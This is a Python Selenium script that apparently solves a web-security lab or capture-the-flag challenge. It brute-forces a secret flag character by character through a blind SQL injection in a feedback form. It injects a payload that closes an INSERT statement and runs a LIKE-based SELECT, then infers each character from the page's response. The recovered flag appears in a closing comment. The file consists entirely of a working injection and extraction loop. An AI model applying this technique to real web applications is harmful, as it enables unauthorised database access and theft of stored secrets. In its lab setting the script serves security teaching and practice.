import string
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
options = Options()
options.headless = True
driver_path = "./geckodriver.exe"
driver = webdriver.Firefox(executable_path=driver_path)
driver.get("https://thesocialnetwork.websec.scy-phy.net/feedback.html")

infb = driver.find_element(By.CLASS_NAME, ("feedback"))
btn = driver.find_element(By.CLASS_NAME, ("fourth"))
res = driver.find_element(By.CLASS_NAME, ("res"))

print(string.printable)
word = ""
end_flag = False
base_str = 'FLAG{F33db4ck:I_st0le_4ll_y0ur_secrets!'
while True:
    for char in string.printable:
        if char in "'%":
            continue
        word = base_str + char + "%"
        input = "','now()'); SELECT f3('" + word + "'); --"
        infb.send_keys(input)
        btn.click()
        if "Thank you" in res.text:
            continue
        else:
            base_str += char
            infb.clear()
            if char == '}':
                end_flag = True
            break
    if end_flag:
        break
print(word)
driver.close()

# FLAG{F33db4ck:I_st0le_4ll_y0ur_secrets!}